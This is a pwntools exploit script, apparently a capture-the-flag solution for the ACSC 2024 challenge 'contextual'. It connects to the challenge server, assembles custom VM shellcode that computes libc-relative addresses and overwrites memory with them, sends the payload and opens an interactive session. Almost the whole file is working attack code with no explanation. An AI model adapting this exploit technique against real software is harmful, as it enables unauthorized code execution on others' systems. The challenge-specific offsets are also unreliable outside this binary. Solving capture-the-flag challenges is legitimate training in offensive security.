#!/usr/bin/python3

from pwn import *
from tools.assembler import *

exe = ELF('distribute/share/contextual', checksec=False)
libc = ELF('distribute/share/libc.so.6', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    gdb.attach(r, gdbscript='''
        # b*0x555555554000+0x1823
        # b*0x555555554000+0x2862
        # b*0x555555554000+0x85E2
        b*0x55555555c986
        b*0x55555555c9f9
        b*0x55555555c670
        b*0x555555554000+0xA165
        c
    ''')


if args.REMOTE:
    r = remote('contextual.chal.2024.ctf.acsc.asia', 10101)
    # r = remote('0', 10101)
else:
    r = remote('0', 10101)
    
    # r = process(exe.path)
    # GDB()


shellcode = aasm('''
        push -0x60c4
        pop <8> r10
        push 0
        pop <1> r12
        sub r10, r12
        push 0
        pop <7> r9
        {}
        {}
        sub r2, r10
        add r2, r12
        add r2, r9
        load <8> r7, [r2]
        
        
        mov r10, r11
        mov r12, r11
        mov r9, r11
        mov r3, r11
        push -0x60d4
        pop <8> r10
        push 0
        pop <1> r12
        sub r10, r12
        push 0
        pop <7> r9
        {}
        {}
        sub r3, r10
        add r3, r12
        add r3, r9
        
        
        mov r10, r11
        mov r12, r11
        mov r9, r11
        mov r1, r11
        push -0x60cc
        pop <8> r10
        push 0
        pop <1> r12
        sub r10, r12
        push 0
        pop <7> r9
        {}
        {}
        sub r1, r10
        add r1, r12
        add r1, r9
        
        mov r10, r11
        mov r12, r11
        mov r9, r11
        mov r8, r11
        push -0x60dc
        pop <8> r10
        push 0
        pop <1> r12
        sub r10, r12
        push 0
        pop <7> r9
        {}
        {}
        sub r8, r10
        add r8, r12
        add r8, r9
        
        push 0x655
        pop <8> r6
        add r6, r7
        push 0x26fe0
        pop <8> r0
        add r0, r7
        store <8> [r8], r0
        store <8> [r2], r6
        push 0x1ae908
        pop <8> r0
        add r0, r7
        store <8> [r1], r0
        push 0x656
        pop <8> r6
        add r6, r7
        store <8> [r3], r6
                 '''.format('sub r9, r9\n'*9, 'sub r12, r12\n'*1, 'sub r9, r9\n'*9, 'sub r12, r12\n'*1, 'sub r9, r9\n'*9, 'sub r12, r12\n'*1, 'sub r9, r9\n'*9, 'sub r12, r12\n'*1))
print(shellcode)
sln(b': ', len(shellcode))
# input()
sa(b': ', shellcode)


r.interactive()
